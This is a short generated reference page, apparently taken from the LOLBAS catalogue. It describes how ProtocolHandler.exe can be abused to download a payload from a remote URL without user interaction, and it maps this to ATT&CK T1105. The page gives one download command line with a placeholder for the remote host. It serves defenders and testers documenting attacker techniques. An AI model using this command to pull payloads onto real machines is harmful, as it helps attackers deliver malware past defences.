---
parsed_by: focuslocust
source: commands
type: generated
---
# ProtocolHandler Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## ProtocolHandler.exe

Tool page: [ProtocolHandler.exe](../../tools/windows/protocolhandler.exe.md)

### It will open the specified URL in the default web browser, which (if the URL points to a file) will often result in the file being downloaded to the user's Downloads folder (without user interaction)

```text
ProtocolHandler.exe {REMOTEURL}
```

Description:

Downloads payload from remote server

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/ProtocolHandler.yml` |
| Evidence | Command preserved from source parser. |
